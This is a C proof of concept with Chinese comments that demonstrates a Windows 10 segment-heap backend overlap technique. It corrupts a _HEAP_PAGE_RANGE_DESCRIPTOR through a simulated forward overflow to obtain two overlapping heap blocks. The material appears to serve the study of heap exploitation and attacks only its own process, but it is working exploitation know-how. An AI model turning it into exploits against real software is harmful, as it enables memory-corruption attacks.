/*
tested on windows 10 x64 19042.630 
注意, 运行该poc时, 先按照readme.txt的指引运行init.bat

backend(BACKEND ALLOCATION) overlap POC 

大致原理:
    写backend的_HEAP_PAGE_RANGE_DESCRIPTOR结构中的UnitSize 和 EncodedCommittedPageCount, 将他们包含的Page的size变大, 来构造overlap
    backend的block之间没有间隙, 是连续的
要求:
    需要能够前向越界写
预期效果:
    获得两个overlap的block

refer: https://gist.github.com/masthoon/50ad5ec5d1bb6b43286f414802a8688c
*/

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

LPVOID ptr[0x20];
HANDLE hHeap;

void init() {
    hHeap = HeapCreate(HEAP_GROWABLE, 0, 0); //HeapCreate(2u, 0i64, 0i64); 分配一个可生长堆
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}
LPVOID Alloc(SIZE_T cb) {
    return HeapAlloc(hHeap, HEAP_ZERO_MEMORY, cb); // HeapAlloc(hHeap, 8u, cb); 类似于calloc
}
BOOL Free(void* ptr) {
    return HeapFree(hHeap, 0, ptr);
}
void log() {
    for (int i = 0; i < 0x20; i++) {
        if (ptr[i]) {
            printf("idx: %d --> %p\n", i, ptr[i]);
        }
    }
    putchar('\n');
}
int main()
{
    init();

    SIZE_T size = 0x20000;
    ptr[0] = Alloc(size); // !heap -x 可以查看 Page descriptor address, 还有实际大小Subsegment Size
    ptr[1] = Alloc(size); // 像这个backend block的大小实际为 0x21000
    log();
    
    intptr_t page_range_addr = (intptr_t)ptr[0] - 0x001fd0; // dt _HEAP_PAGE_RANGE_DESCRIPTOR 0x000002e2ca300040 -r 
    /*
    0:000> dq 0x000002e2ca300040
    000002e2`ca300040  00000ff0`ccddccdd 00000000`00000000
    000002e2`ca300050  00000000`00000000 2100ffde`00000103 # 写这个位置, 这个位置其实我们只需要改前面的 2100ffde
    */
    SIZE_T real_size = 0x21000*2; // 这个是拓展后实际大小的总和, 在这里也就是之前分配的两个实际大小0x21000*2
    SIZE_T value = 0x103 | ((real_size >> 12) << 56) | ((0xffff - (real_size >> 12)) << 32);

    // corrupt 
    *(SIZE_T*)(page_range_addr + 0x18) = value;

    // trigger
    Free(ptr[0]); ptr[0] = 0;
    
    // fill old ptr[0]
    ptr[0] = Alloc(size);
    ptr[2] = Alloc(size); // ptr[1] overlap ptr[2]
    log();

    printf("ptr[1] range: %p--%p\n", ptr[1], (intptr_t)ptr[1] + 0x20000);
    printf("ptr[2] range: %p--%p\n", ptr[2], (intptr_t)ptr[2] + 0x20000);
    return 0;
}